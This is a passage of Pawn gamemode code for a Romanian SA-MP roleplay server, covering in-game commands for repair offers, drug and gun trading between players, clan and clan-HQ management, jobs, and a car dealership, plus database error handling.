	if !IsPlayerLogged(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");


	new engine,lights,alarm,doors,bonnet,boot,objective;
	GetVehicleParamsEx(GetPlayerVehicleID(id),engine,lights,alarm,doors,bonnet,boot,objective);
	if engine *then 
		return SendClientMessage(playerid, -1, "Acel player are motorul pornit!");

	if money < 1 || money > 20000 *then 
		return SendClientMessage(playerid, COLOR_WHITE, "Pretul trebuie sa fie cuprins intre $1 si $20,000!");

	if !ProxDetectorS(8.0, playerid, id)&& !IsPlayerInAnyVehicle(id) *then 
		return SendClientMessage(playerid, -1, "Acel player nu este in raza ta sau nu se afla intr-un vehicul.");

	if id == playerid *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");


	SCMf(playerid, COLOR_MONEY, "* I-ai oferit lui %s posibilitatea de a-i repara vehiculul in schimbul a $%s .",GetName(id),FormatNumber(money));
	SCMf(id, COLOR_MONEY, "* Mecanicul %s doreste sa-ti repare vehiculul in schimbul a $%s, (scrie /accept repair %d) pentru a accepta.",GetName(playerid),FormatNumber(money),playerid);
	RepairOffer[id] = playerid;
	RepairPrice[id] = money;
	Rapairx[playerid] = id;
	return true;
}
cmd:selldrugs(playerid, params[]) {
	if PlayerInfo[playerid][pJob] != 6 *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu ai jobul 'Distribuitor de droguri'.");

	extract params -> new player:id, needed, money; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/selldrugs <playerid/name> <Drugs> <Price>");

	if !strcmp(GetIPP(playerid), GetIPP(id), true) *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti transfer bani de pe acelasi IP.");

	if needed < 1 || needed > 50 *then 
		return SendClientMessage(playerid, -1, "Gramele de droguri trebuie sa fie cuprinse intre 1 si 50 grame!");

	if money < 1 || money > 50000 *then 
		return SendClientMessage(playerid, -1, "Pretul trebuie sa fie cuprins intre $1 si $150.000!");

	if needed > PlayerInfo[playerid][pDrugs] *then 
		return SendClientMessage(playerid, COLOR_WHITE,"Nu ai aceasta suma Drugs with you.");

	if PlayerInfo[playerid][pJailTime] != 0 *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti vinde lucruri atata timp cat esti in jail!");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !IsPlayerLogged(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");

	if !ProxDetectorS(8.0, playerid, id) *then 
		return SendClientMessage(playerid, -1, "Acel player nu este langa tine.");

	if id == playerid *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");

	SCMf(playerid, COLOR_MONEY, "* I-ai oferit lui %s, %d grame de droguri pentru %s$.", GetName(id), needed, FormatNumber(money));
	SCMf(id, COLOR_MONEY, "* %s ti-a oferit %d grame de droguri pentru %s$, (scrie /accept drugs %d) pentru a accepta.", GetName(playerid), needed, FormatNumber(money),playerid);
	DrugOffer[id] = playerid;
	DrugPrice[id] = money;
	DrugGram[id] = needed;
	return true;
}
cmd:sellgun(playerid, params[]) {
	if PlayerInfo[playerid][pJob] != 5 *then 
		return SendClientMessage(playerid,-1,"Nu ai jobul Arms Dealer");

	extract params -> new player:id, string:gunname[32], price; else {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/sellgun <playerid/name> <Gun Name> <price>");
		SendClientMessage(playerid, COLOR_WHITE, "Weapons:{FFFFFF} SDPistol(100) Deagle(150)");
		SendClientMessage(playerid, COLOR_WHITE, "Weapons:{FFFFFF} MP5(200) Shotgun(300)");
		SendClientMessage(playerid, COLOR_WHITE, "Weapons:{FFFFFF} AK47(350) M4(400) Rifle(600)");
		return true;
	}
	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !IsPlayerLogged(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");

	if playerid == id *then 
		return SendClientMessage(playerid,COLOR_WHITE,"You can not sell yourself weapons.");

	if PlayerInfo[playerid][pJailTime] != 0 *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti vinde lucruri atata timp cat esti in jail!");

	if IsPlayerInAnyVehicle(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda atata timp cat acel player este intr-un vehicul.");

	if PlayerToPoint(300, playerid, -1423.5153,935.8321,1036.4756) *then 
		return SendClientMessage(playerid, -1, "Nu poti folosi aceasta comanda in arena de evente.");
	
	if !PlayerInfo[id][pGunLic] *then 
		return SendClientMessage(playerid,COLOR_WHITE,"This player does not have arms license.");

	switch YHash(gunname) do {
		case _H<sdpistol>: {
			if PlayerInfo[playerid][pMats] < 100 *then 
				return SendClientMessage(playerid,COLOR_GREY, "Nu ai destule materiale pentru aceasta arma.");

			SellgunMats[id] = 100;
			SellgunAmmo[id] = 100;
			SellgunID[id] = 23;
		}
		case _H<deagle>: {
			if PlayerInfo[playerid][pMats] < 150 *then 
				return SendClientMessage(playerid,COLOR_GREY, "Nu ai destule materiale pentru aceasta arma.");
			
			SellgunMats[id] = 150;
			SellgunAmmo[id] = 100;
			SellgunID[id] = 24;
		}
		case _H<mp5>: {
			if PlayerInfo[playerid][pMats] < 200 *then 
				return SendClientMessage(playerid,COLOR_GREY, "Nu ai destule materiale pentru aceasta arma.");
			
			SellgunMats[id] = 200;
			SellgunAmmo[id] = 150;
			SellgunID[id] = 29;
		}
		case _H<shotgun>: {
			if PlayerInfo[playerid][pMats] < 300 *then 
				return SendClientMessage(playerid,COLOR_GREY, "Nu ai destule materiale pentru aceasta arma.");
			
			SellgunMats[id] = 300;
			SellgunAmmo[id] = 50;
			SellgunID[id] = 25;
		}
		case _H<ak47>: {
			if PlayerInfo[playerid][pMats] < 350 *then 
				return SendClientMessage(playerid,COLOR_GREY, "Nu ai destule materiale pentru aceasta arma.");
			
			SellgunMats[id] = 350;
			SellgunAmmo[id] = 150;
			SellgunID[id] = 30;
		}
		case _H<m4>: {
			if PlayerInfo[playerid][pMats] < 400 *then 
				return SendClientMessage(playerid,COLOR_GREY, "Nu ai destule materiale pentru aceasta arma.");
			
			SellgunMats[id] = 400;
			SellgunAmmo[id] = 150;
			SellgunID[id] = 31;
		}
		case _H<rifle>: {
			if PlayerInfo[playerid][pMats] < 600 *then 
				return SendClientMessage(playerid,COLOR_GREY, "Nu ai destule materiale pentru aceasta arma.");
			
			SellgunMats[id] = 600;
			SellgunAmmo[id] = 25;
			SellgunID[id] = 33;
		}
		default: return SendClientMessage(playerid,COLOR_WHITE,"Numele armei este invalid.");
	}
	if price < 1 || price > 100000 *then 
		return SendClientMessage(playerid,COLOR_WHITE,"Pretul trebuie sa fie intre $1 si $100.000.");

	if !ProxDetectorS(5.0, playerid, id) *then 
		return SendClientMessage(playerid, -1, "Acel player nu este langa tine.");

	SellgunOffer[id]=playerid;
	SellgunPrice[id]=price;
	CheckMission(playerid, 13);
	SCMf(playerid, COLOR_MONEY, "* I-ai oferit lui %s %s pentru %s$.",GetName(id),gunname,FormatNumber(price));
	SCMf(id, COLOR_MONEY, "* %s ti-a oferit %s pentru %s$, (scrie /accept gun %d) pentru a accepta.",GetName(playerid),gunname,FormatNumber(price),playerid);
	return true;
}

public OnQueryError(errorid, const error[], const callback[], const query[], MySQL:handle) {
	if(errorid == 2013) return true;
	if(errorid == 2003) {		
		foreach(new i : logged_players) {
			SendClientMessage(i, COLOR_CLIENT, "SERVER: Ai primit kick deoarece sunt probleme tehnice cu baza de date!");
			SendClientMessage(i, COLOR_CLIENT, "SERVER: Revenim cat mai repede posibil. Nu exista un termen anume.");
		}
		SendRconCommand("password boss");
		format(gString, sizeof gString, "hostname %s RPG - Probleme tehnice (0.3.7)", sv_generalname);
		SendRconCommand(gString);
		return true;
	}
	print( "====================================================================" );
	printf( "Error ID: %d, Erorr: %s", errorid, error );
	printf( "Callback: %s", callback );
	printf( "gQuery: %s", query );
	print( "====================================================================" );
	return true;
}
cmd:stopwork(playerid) {
	if(GetPlayerVirtualWorld(playerid) == 1339 && temp_work[playerid]) return fail_jail_job(playerid);
	if(!JobWorking[playerid]) return SendErrorMsg(playerid, "Nu muncesti!");
	return stopWork(playerid);
}

stock stopWork(playerid, reason = 0) {
	if(!JobWorking[playerid]) return true;
	switch(reason) {
		case 0: SendClientMessage(playerid, -1, "{75db3d}(Job) {FFFFFF}Nu mai muncesti.");
		case 1: SendClientMessage(playerid, -1, "{75db3d}(Job) {FFFFFF}Job esuat! Ai parasit vehiculul.");
		case 2: SendClientMessage(playerid, -1, "{75db3d}(Job) {FFFFFF}Job esuat! Ai stat AFK timp de 2 minute.");
		case 5: SendClientMessage(playerid, -1, "{75db3d}(Job) {FFFFFF}Pretenul tau a oprit munca.");
		case 6: SendClientMessage(playerid, -1, "{75db3d}(Fisher Job) {FFFFFF}You lose the fish!");
		case 7: SendClientMessage(playerid, COLOR_YELLOW, "Ai parasit zona jobului!");
	}
	if(JobVehicle[playerid] != 0) { ServerVehicles[JobVehicle[playerid]][vJob] = 0; DestroyVehicleEx(JobVehicle[playerid], ""); RemoveVehicleKey(playerid, JobVehicle[playerid]); JobVehicle[playerid] = 0;}
	if(Trailer[playerid] != 0) { DestroyVehicleEx(Trailer[playerid], ""); vehiclePlayerID[Trailer[playerid]] = INVALID_PLAYER_ID; Trailer[playerid] = 0; }
	
	PlayerTextDrawHide(playerid, JobTD);
	PlayerTextDrawHide(playerid, InfosTD);	

	JobDeelay[playerid] = gettime()+60;
	CurseFacute[playerid]=StatusJob[playerid]=BagTime[playerid]=CP[playerid]=0;
	SpecialJobWorking[playerid]=BlockEnter[playerid] = false;
	TogglePlayerControllable(playerid, true);
	DisablePlayerCheckpointEx(playerid);
	DisablePlayerRaceCheckpoint(playerid);
	switch(PlayerInfo[playerid][pJob]) {
		case 1: RemovePlayerAttachedObject(playerid, 4);
		case 3: {
			for(new i=0;i<6;i++) DestroyDynamicObject(LumberObj[playerid][i]), LumberObj[playerid][i] = 0;
			RemovePlayerAttachedObject(playerid, 3);
			for(new i=0,j=sizeof g_Tree;i<j;i++) {
				if(TreeObj[playerid][i]) continue;

				TreeObj[playerid][i] = CreateDynamicObject(660, g_Tree[i][0], g_Tree[i][1], g_Tree[i][2],   0.00000, 0.00000, 0.00000, 0, 0, playerid, 300.00);
			}
			SetPlayerSpecialAction(playerid, 0);	
		}
		case 4: {
			DisablePlayerRaceCheckpoint(playerid);
			PlayerTextDrawHide(playerid, GarbagePTD);
		}
		case 7: {
			new id = jobWork[playerid]; jobWork[playerid] = -1;
			JobWorking[playerid] = false;
			if(id!=INVALID_PLAYER_ID && JobWorking[id]) stopWork(id, 5);
		}
		case 9: {
			if(JobWorking[playerid]==2) {
				RemovePlayerAttachedObject(playerid, 5);
				InHand[playerid] = false;
				if(player_selected[playerid]==18) {
					for(new i=0;i<11;i++) TextDrawHideForPlayer(playerid, PizzaTD[i]);
					PlayerTextDrawHide(playerid, PizzaPTD);
					player_selected[playerid] = 0;
					CancelSelectTextDraw(playerid);
					SetCameraBehindPlayer(playerid);
				}
				if(GetPlayerInterior(playerid)==5) {
					SetPlayerVirtualWorld(playerid, 0);
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, 2638.6838,1849.8210,11.0234);
				}
			}
		}
		case 15: {
			DestroyPlayerObject(playerid, LumberObj[playerid][0]); LumberObj[playerid][0] = 0;
			SetPlayerSpecialAction(playerid, 0);	
			RemovePlayerAttachedObject(playerid, 3);
			RemovePlayerAttachedObject(playerid, 4);
		}
		case 11,13,16: {
			if(_fishObj[playerid]) DestroyDynamicPickup(_fishObj[playerid]);
			_fishObj[playerid] = 0;
			BagTime[playerid] = 0;
			FishTimer[playerid] = 0;
			RemovePlayerAttachedObject(playerid, 1);
		}
	}
	JobWorking[playerid] = 0;
	return true;
}

cmd:fmembers(playerid, params[]) {
	#pragma unused params
	if(!PlayerInfo[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte dintr-o factiune!");
	SendClientMessage(playerid, COLOR_SERVER, "-- Jucatori conectati din factiune --");
	foreach(new i : faction_players<PlayerInfo[playerid][pMember]>) sendSplittedMessageToPlayer(playerid, COLOR_WHITE, COLOR_WHITE, "%s (%d),", GetName(i), i);
	va_SendClientMessage(playerid, COLOR_LGREEN, "Sunt %d jucatori conectati din factiune.", Iter_Count(faction_players<PlayerInfo[playerid][pMember]>));
	return true;
}
cmd:cmembers(playerid, params[]) {
	#pragma unused params
	if(!PlayerInfo[playerid][pClan]) return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte dintr-un clan!");
	SendClientMessage(playerid, COLOR_SERVER, "-- Jucatori conectati din clan --");
	foreach(new i : clan_players<PlayerInfo[playerid][pClan]>) sendSplittedMessageToPlayer(playerid, COLOR_WHITE, COLOR_WHITE, "%s (%d),", GetName(i), i);
	va_SendClientMessage(playerid, COLOR_LGREEN, "Sunt %d jucatori conectati din clan.", Iter_Count(clan_players<PlayerInfo[playerid][pClan]>));
	return true;
}

cmd:deleteclan(playerid, params[]) {
	if(!IsAdmin(playerid, 6))
		return auth_msg(playerid);

	extract params -> new clanid; else {
 		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/deleteclan <id>");
 		mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `clans`");
 		mysql_tquery(SQL, gQuery, #cache_deleteclan, #i, playerid);
 		SendClientMessage(playerid, -1, "IMPORTANT: Foloseste ({FFFF00}/infoclan{FFFFFF}) pentru a vedea clanurile expiare!");
		return true;
	}
	foreach(new i : clan_players<clanid>) {
        SendClientMessage(i, COLOR_CLIENT, "[INFO] Ai fost demis din acest clan! Motiv: Clanul a fost sters de un admin.");
        PlayerInfo[i][pClan] = 0;
        PlayerInfo[i][pClanRank] = 0;
        SetPlayerName(i, PlayerInfo[i][pUsername]);
		_query("UPDATE `users` SET `Clan`='0', `ClanRank`='0', `ClanDays`='0', `ClanWarns`='0' WHERE `Name`='%s'", GetName(i));
        if(SpawnChange[i] == 2) SpawnChange[i] = 0;
	}
	Iter_Clear(clan_players<clanid>);
	for(new h = 1; h <= SQL_clanzone; h++) {
	    if(GraffitiInfo[h][gfOwned] == clanid && clanid != 0) {
	        GraffitiInfo[h][gfOwned] = 0;
			DestroyDynamicObject(GraffitiInfo[h][gfObject]);
			GraffitiInfo[h][gfObject] = CreateDynamicObject(19373, GraffitiInfo[h][gfX], GraffitiInfo[h][gfY], GraffitiInfo[h][gfZ], GraffitiInfo[h][gfRotX], GraffitiInfo[h][gfRotY], GraffitiInfo[h][gfRotZ]);
		    SetDynamicObjectMaterialText(GraffitiInfo[h][gfObject], 0, "None", OBJECT_MATERIAL_SIZE_256x128, "BankGothic Md BT", 60, 1, 0xfff0f0f0, 0, 1);
			GangZoneStopFlashForAll(ClanTurfs[h]);
			GraffitiInfo[h][gfAttacked] = 0;
			GraffitiInfo[h][gfPlayerSpray] = -1;
		}
	}
	_query("UPDATE `graffiti` SET `Owned`='0' WHERE `Owned`='%d'", clanid);
    ClanInfo[clanid][clName] = 0x00;
	_query("UPDATE `users` SET `Clan`='0', `ClanRank`='0', `ClanDays`='0', `ClanWarns`='0' WHERE `Clan`='%d'", clanid);
	SCMf(playerid, COLOR_YELLOW, "Ai sters clanul cu succes! [%d Membrii online au fost scosi]", Iter_Count(clan_players<clanid>));
	Iter_Clear(clan_players<clanid>);
	_query("DELETE FROM `clans` WHERE `ID`='%d'", clanid);
	return true;
}

redist::cache_deleteclan(playerid) {
	if(!cache_num_rows()) return true;

	new i=-1, id;
	while(++i<cache_num_rows()) {
		cache_get_value_name_int(i, "ID", id);
		SCMf(playerid, COLOR_WHITE, "%d. Clan: %s (%s) | Owner: %s", ClanInfo[id][cID], ClanInfo[id][clName], ClanInfo[id][clTag], ClanInfo[id][clOwner]);
	}

	return true;
}

redist::RemoveClan(clanid) {
	foreach(new i : clan_players<clanid>) {
        SendClientMessage(i, COLOR_YELLOW, "Ai fost demis din acest clan! Motiv: Clanul a expirat.");
        SendClientMessage(i, COLOR_YELLOW, "Server: Tag-ul a fost scos. Numele tau nu a fost afectat.");
        PlayerInfo[i][pClan] = 0;
        PlayerInfo[i][pClanRank] = 0;
        SetPlayerName(i, PlayerInfo[i][pUsername]);
		mysql_format(SQL, gQuery, 180, "UPDATE `users` SET `Clan`='0', `ClanRank`='0', `ClanDays`='0', `ClanWarns`='0' WHERE `Name`='%s'", GetName(i));
		mysql_tquery(SQL, gQuery);
	}
	Iter_Clear(clan_players<clanid>);
	for(new h = 1; h < SQL_clanzone; h++) {
	    if(GraffitiInfo[h][gfOwned] == clanid && clanid != 0) {
	        GraffitiInfo[h][gfOwned] = 0;
			DestroyDynamicObject(GraffitiInfo[h][gfObject]);
			GraffitiInfo[h][gfObject] = CreateDynamicObject(19373, GraffitiInfo[h][gfX], GraffitiInfo[h][gfY], GraffitiInfo[h][gfZ], GraffitiInfo[h][gfRotX], GraffitiInfo[h][gfRotY], GraffitiInfo[h][gfRotZ]);
		    SetDynamicObjectMaterialText(GraffitiInfo[h][gfObject], 0, "None", OBJECT_MATERIAL_SIZE_256x128, "BankGothic Md BT", 60, 1, 0xfff0f0f0, 0, 1);
	    }
	}
	_query("UPDATE `graffiti` SET `Owned`='0' WHERE `Owned`='%d'", clanid);
    ClanInfo[clanid][clName]=0x00;
	_query("UPDATE `users` SET `Clan`='0', `ClanRank`='0', `ClanDays`='0', `ClanWarns`='0' WHERE `Clan`='%d'", clanid);
	_query("DELETE FROM `clans` WHERE `ID`='%d'",clanid);
	return true;
}

redist::GetPlayerHealthEx(playerid, &Float:health) {
	health = Health[playerid];
	return true;
} 
redist::SetPlayerHealthEx(playerid, Float:health) {
	SetPlayerHealth(playerid, health);
	Health[playerid] = health;
	return true;
}
redist::GetPlayerArmourEx(playerid, &Float:armour) {
	armour = Armour[playerid];
	return true;
}
redist::SetPlayerArmourEx(playerid, Float:armour) {
	SetPlayerArmour(playerid, armour);
	Armour[playerid] = armour;	
	return true;
}

public OnPlayerStreamIn(playerid, forplayerid) {
	if(PlayerHit[playerid] != -1) return ShowPlayerNameTagForPlayer(forplayerid, playerid, 0);
	if(PaintType[playerid] == PaintType[forplayerid] && PaintType[playerid] != 0 )
	{
		SetPlayerMarkerForPlayer( playerid, forplayerid, COLOR_LIGHTRED );
		SetPlayerMarkerForPlayer( forplayerid, playerid, COLOR_LIGHTRED );
	}
	else if(IsACop(playerid) && OnDuty[playerid] == 1 && PlayerInfo[forplayerid][pWantedLevel] != 0) {
		SetPlayerMarkerForPlayer( playerid, forplayerid, 0xe3336d00 );
	}	
	else if(InWarTurf[PlayerInfo[playerid][pMember]] != -1 || Iter_Contains(race_players, playerid) || jobWork[playerid]==forplayerid) {
		SetPlayerMarkerForPlayer( playerid, forplayerid, GetPlayerColor( forplayerid ) );
		SetPlayerMarkerForPlayer( forplayerid, playerid, GetPlayerColor( playerid ) );
	}	
	else
	{
		SetPlayerMarkerForPlayer( playerid, forplayerid, ( GetPlayerColor( forplayerid ) & 0xFFFFFF00 ) );
		SetPlayerMarkerForPlayer( forplayerid, playerid, ( GetPlayerColor( playerid ) & 0xFFFFFF00 ) );
	}
	return true;
}
public OnPlayerStreamOut(playerid, forplayerid) {
	if(PlayerHit[playerid] != -1) ShowPlayerNameTagForPlayer(forplayerid, playerid, 0);
    SetPlayerMarkerForPlayer( playerid, forplayerid, ( GetPlayerColor( forplayerid ) & 0xFFFFFF00 ) );
	SetPlayerMarkerForPlayer( forplayerid, playerid, ( GetPlayerColor( playerid ) & 0xFFFFFF00 ) );
	return true;
}

stock IsACBUGWeapon(playerid) {
	if(IsPlayerConnected(playerid) && (IsPlayerLogged(playerid))) {
	    new wID = GetPlayerWeapon ( playerid ) ;
	    if(wID == 24 || wID == 25 || wID == 27 || wID == 34 ) return 1 ;
	}
	return 0 ;
}

redist::AttachTrailer(playerid) {
	new Float:pX, Float:pY, Float:pZ;
	GetPlayerPos(playerid,pX,pY,pZ);
	new Float:vX, Float:vY, Float:vZ;
	GetVehiclePos(Trailer[playerid],vX,vY,vZ);
	if((floatabs(pX-vX)<100.0)&&(floatabs(pY-vY)<100.0)&&(floatabs(pZ-vZ)<100.0)&&(Trailer[playerid]!=GetPlayerVehicleID(playerid)))  AttachTrailerToVehicle(Trailer[playerid],GetPlayerVehicleID(playerid));
	return true;
}

redist::ClearWanted(playerid) {
	if !IsPlayerConnected(playerid) *then return true;
	posible_wanted[playerid] = -1;
	return true;
}
cmd:givevehicle(playerid, params[]) {
	if(!IsAdmin(playerid, 7)) return SendErrorMsg(playerid, AdminOnly);
	extract params -> new id, model; else return SendUsageMsg(playerid, "givevehicle [id] [model id]");	
	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(!IsPlayerLogged(id)) return SendErrorMsg(playerid, "Acel player nu este logat!");
	if(GetVehicleSlots(id) <= Iter_Count(MyVehicle<id>)) return SendErrorMsg(playerid, "Acel player are numarul maxim de masini personale!");
	
	va_SendClientMessage(id, COLOR_YELLOW, "Ai primit un %s de la administratorul %s.", aVehicleNames[model-400], GetName(playerid));
	va_SendClientMessage(playerid, COLOR_YELLOW, "I-ai dat lui %s un %s.", GetName(id), aVehicleNames[model-400]);
	return GiveVehicle(id, model);
}

cmd:clanhq(playerid, params[]) {
	new clan, HQ_ID;
	if(!(clan = PlayerInfo[playerid][pClan])) return true;
	if(PlayerInfo[playerid][pClanRank] < 7) return true;
	if(!(HQ_ID=ClanInfo[clan][clHQ])) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu detineti un clan HQ.");
	ClanHQInfo[HQ_ID][cStatus] = ClanHQInfo[HQ_ID][cStatus]?false:true;
	SendClientMessage(playerid, COLOR_LGREEN, ClanHQInfo[HQ_ID][cStatus]?("Ai inchis clan HQ"):("Ai deschis clan HQ"));
	UpdateLabel(4, HQ_ID);
	gQuery[0] = (EOS);
	mysql_format(SQL, gQuery, 128, "UPDATE `clanhq` SET `Status` = '%i' WHERE `ID` = '%i'", ClanHQInfo[HQ_ID][cStatus], ClanHQInfo[HQ_ID][cID]);
	mysql_tquery(SQL, gQuery);
	return true;
}

cmd:buycar(playerid, params[]) {
	if(PlayerInfo[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_GREY, "Nu ai nivel 3!");
	if(player_selected[playerid]!=0||DealerID[playerid]!=-1) return true;
	if(!PlayerToPoint(3,playerid,2131.7717,-1151.3202,24.0600)) return SendClientMessage(playerid, COLOR_GREY, "Nu esti la dealership.");
	if(PlayerInfo[playerid][pWantedLevel] > 0) return SendClientMessage(playerid, -1, "Ai wanted, nu poti folosi aceasta comanda!");
	TogglePlayerControllable(playerid, 0);
	SetPlayerVirtualWorld(playerid, playerid+1);
	SetPlayerInterior(playerid, 0);
	DealerID[playerid] = 0;
	DealerCar[playerid] = CreateVehicleEx(DSModels[DealerID[playerid]][dModel],2128.3125,-1132.6002,25.2857,359.1203,1,1);
	SetVehicleVirtualWorld(DealerCar[playerid],playerid+1);
	LinkVehicleToInterior(DealerCar[playerid], 0);	
	ShowDealershipTextdraws(playerid);
	SelectTextDraw(playerid, 0x15B864FF);
	player_selected[playerid] = 3;
	SetPlayerCameraPos(playerid, 2119.590332, -1123.766113, 26.368352);
	SetPlayerCameraLookAt(playerid, 2122.885986, -1127.502929, 25.949714);
	return true;
}

cmd:quitclan(playerid, params[]) {
    new clanid = PlayerInfo[playerid][pClan];
    if(clanid == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte dintr-un clan!");
	if(PlayerInfo[playerid][pClanRank] == 7) return SendClientMessage(playerid, -1, "Nu poti parasi clanul deoarece esti lider!");
	ShowPlayerDialog(playerid, DIALOG_QUITCLAN, DIALOG_STYLE_MSGBOX, "Server:", "Esti sigur ca vrei sa parasesti acest clan?", "Da", "Nu");
	return true;
}

cmd:cdeposit(playerid, params[]) {
	if(!PlayerInfo[playerid][pClan])
		return SendClientMessage(playerid, -1, "Nu esti intr-un clan!");

	ShowPlayerDialog(playerid, DIALOG_DEPOSITPP, DIALOG_STYLE_INPUT, "Deposit Premium Points:", "Esti sigur ca vrei sa depozitezi puncte premium pentru clan?\nCu punctele premium din clan se pot lua diferite chestii (ex: HQ)", "Ok", "Cancel");
	return true;
}

cmd:clanduty(playerid, params[]) {
	new clanid = PlayerInfo[playerid][pClan];
    if(clanid == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte dintr-un clan!");
    if(PlayerInfo[playerid][pSleeping]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu te poti pune CLAN-DUTY cat timp esti pe (/sleep).");
	switch(ClanDuty[playerid]) {
	    case 0: SendClientMessage(playerid, -1, "You are now on duty!"), ClanDuty[playerid] = 1;
	    case 1: {
			if(StartedSpray[playerid] == 1 || ClanDuty[playerid] == 1) {
				SendClientMessage(playerid, -1, "You are now off duty!");
				new i = StartedSprayOn[playerid], cl = GraffitiInfo[i][gfOwned];
				format(gString, 180, "{%s}(Clan) {FFFFFF}%s (din clanul %s) nu a reusit sa deseneze complet peretele (turf id %d).", ClanInfo[cl][clColor], GetName(playerid), ClanInfo[PlayerInfo[playerid][pClan]][clName], GraffitiInfo[i][gfID]);
				SendClanMessage(GraffitiInfo[i][gfOwned], gString);
				GangZoneStopFlashForAll(ClanTurfs[i]);
				GraffitiInfo[i][gfAttacked] = 0;
				GraffitiInfo[i][gfPlayerSpray] = -1;
				StartedSpray[playerid] = 0;
				StartedSpray2[playerid] = 0;
				StartedSprayOn[playerid] = 0;
				ClanProces[playerid] = 0;
				ClanDuty[playerid] = 0;
			}
		}
	}
	return true;
}
cmd:createclanhq(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 7) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti autorizat sa folosesti aceasta comanda.");
	if(clanhqid >= MAX_CLANHQ) return SCMf(playerid, COLOR_LGREEN, "Eroare: Poti pune maxim %d clan HQ.", MAX_CLANHQ);
	new price;
	if(sscanf(params, "i", price)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/createclanhq <price>");
	gQuery[0] = EOS;
	mysql_format(SQL, gQuery, sizeof(gQuery), "INSERT INTO clanhq (`Price`) VALUES ('%d')", price);
	mysql_tquery(SQL, gQuery, "CLanHQ", "ii", playerid, price);
	clanhqid ++;
	return true;
}

redist::CLanHQ(playerid, price) {
	new id = cache_insert_id(), Float: Pos[3];
	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);

	ClanHQInfo[id][cID] = id;
	ClanHQInfo[id][cPosX] = Pos[0]; ClanHQInfo[id][cPosY] = Pos[1]; ClanHQInfo[id][cPosZ] = Pos[2];
	ClanHQInfo[id][cEnterX] = 1701.2400; ClanHQInfo[id][cEnterY] = -1668.0300; ClanHQInfo[id][cEnterZ] = 20.2188;
	ClanHQInfo[id][cPrice] = price; ClanHQInfo[id][cStatus] = true; ClanHQInfo[id][cVirtualWorld] = id+40;

	_query("UPDATE `clanhq` SET `VirtualWorld`='%d' WHERE `ID`='%d'", id+40, id);
	_query("UPDATE `clanhq` SET `PosX`='%f', `PosY`='%f', `PosZ`='%f', `EnterX`='%f', `EnterY`='%f', `EnterZ`='%f' WHERE `ID`='%d'", ClanHQInfo[id][cPosX], ClanHQInfo[id][cPosY], ClanHQInfo[id][cPosZ], ClanHQInfo[id][cEnterX], ClanHQInfo[id][cEnterY], ClanHQInfo[id][cEnterZ], id);

	SendAdminMessage(COLOR_LIGHTRED, "(/createclanhq) {FFFFFF}%s create a hq with the price %s.", 1, GetName(playerid), FormatNumber(price));
	return UpdateLabel(4, id);
}
cmd:findchq(playerid, params[]) {
	if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
	extract params -> new id; else return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/findclanhq <HQ id>");
	if(id<=0||id>sizeof ClanHQInfo) return true;
	if(!ClanHQInfo[id][cID]) return true;
	SetPlayerCheckpoint(playerid, ClanHQInfo[id][cPosX], ClanHQInfo[id][cPosY], ClanHQInfo[id][cPosZ], 3.0);
	CP[playerid] = 53;
	SCMf(playerid, COLOR_YELLOW, "Ti-am pus un checkpoint pe mapa la HQ %d.", id);
	return true;
}
cmd:movechq(playerid, params[]) {
	if !IsAdmin(playerid, 6) *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti autorizat sa folosesti aceasta comanda.");

	extract params -> new id; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/moveclanhq <HQ id>");

	GetPlayerPos(playerid, ClanHQInfo[id][cPosX], ClanHQInfo[id][cPosY], ClanHQInfo[id][cPosZ]);
	_query("UPDATE `clanhq` SET `PosX`='%f', `PosY`='%f', `PosZ`='%f' WHERE `ID`='%d'", ClanHQInfo[id][cPosX], ClanHQInfo[id][cPosY], ClanHQInfo[id][cPosZ], ClanHQInfo[id][cID]);
	SCMf(playerid, COLOR_GOLD, "Ai mutat cu succes clan HQ cu id %d.", id);
	UpdateLabel(4, id);
	return true;
}
cmd:gotochq(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 3) return true;
	new id;
	if(sscanf(params, "i", id)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/gotochq <hq id>");
	if(ClanHQInfo[id][cPrice] == 0) return SendClientMessage(playerid, COLOR_GREY, "Invalid!");
